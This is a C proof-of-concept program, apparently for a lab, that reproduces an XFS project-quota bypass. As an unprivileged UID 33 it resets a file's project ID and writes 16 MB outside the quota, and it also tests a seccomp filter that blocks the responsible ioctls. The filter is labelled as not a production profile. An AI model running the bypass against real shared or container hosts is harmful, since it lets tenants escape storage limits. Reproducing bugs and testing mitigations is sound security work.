/* SPDX-License-Identifier: MIT
 * Lab-only reproduction: an inode owner can change XFS project attributes.
 * The filter here proves the mitigation mechanism; it is NOT a production
 * container seccomp profile (it deliberately permits all unrelated syscalls).
 */
#define _GNU_SOURCE
#include <errno.h>
#include <fcntl.h>
#include <linux/filter.h>
#include <linux/fs.h>
#include <linux/seccomp.h>
#include <stddef.h>
#include <stdio.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/prctl.h>
#include <sys/syscall.h>
#include <unistd.h>

static void fail(const char *message) { perror(message); _exit(1); }

static void filter(void) {
    struct sock_filter instructions[] = {
        BPF_STMT(BPF_LD | BPF_W | BPF_ABS, offsetof(struct seccomp_data, nr)),
        BPF_JUMP(BPF_JMP | BPF_JEQ | BPF_K, SYS_ioctl, 0, 4),
        BPF_STMT(BPF_LD | BPF_W | BPF_ABS, offsetof(struct seccomp_data, args[1])),
        BPF_JUMP(BPF_JMP | BPF_JEQ | BPF_K, FS_IOC_FSSETXATTR, 1, 0),
        BPF_JUMP(BPF_JMP | BPF_JEQ | BPF_K, FS_IOC_SETFLAGS, 0, 1),
        BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_ERRNO | EPERM),
        BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_ALLOW),
    };
    struct sock_fprog program = {.len = sizeof(instructions) / sizeof(instructions[0]), .filter = instructions};
    if (prctl(PR_SET_NO_NEW_PRIVS, 1, 0, 0, 0) || prctl(PR_SET_SECCOMP, SECCOMP_MODE_FILTER, &program)) fail("seccomp");
}

int main(int argc, char **argv) {
    if (argc != 3 || (strcmp(argv[1], "bypass") && strcmp(argv[1], "blocked"))) return 1;
    if (setgid(33) || setuid(33)) fail("drop UID");
    int fd = open(argv[2], O_RDWR | O_NOFOLLOW | O_CLOEXEC);
    if (fd < 0) fail("open test file");
    struct fsxattr attr;
    if (ioctl(fd, FS_IOC_FSGETXATTR, &attr) || attr.fsx_projid == 0) fail("get assigned project");
    attr.fsx_projid = 0;
    attr.fsx_xflags &= ~FS_XFLAG_PROJINHERIT;
    if (!strcmp(argv[1], "blocked")) {
        filter();
        if (ioctl(fd, FS_IOC_FSSETXATTR, &attr) == 0 || errno != EPERM) fail("quota bypass was not blocked");
        puts("OWNER_BYPASS_BLOCKED_BY_LAB_FILTER");
        return 0;
    }
    if (ioctl(fd, FS_IOC_FSSETXATTR, &attr)) fail("owner project change");
    char buffer[4096] = {0};
    for (int i = 0; i < 4096; i++) if (write(fd, buffer, sizeof(buffer)) != sizeof(buffer)) fail("write outside project");
    if (fsync(fd)) fail("fsync");
    puts("OWNER_BYPASS_REPRODUCED_UID33_16M");
    return 0;
}
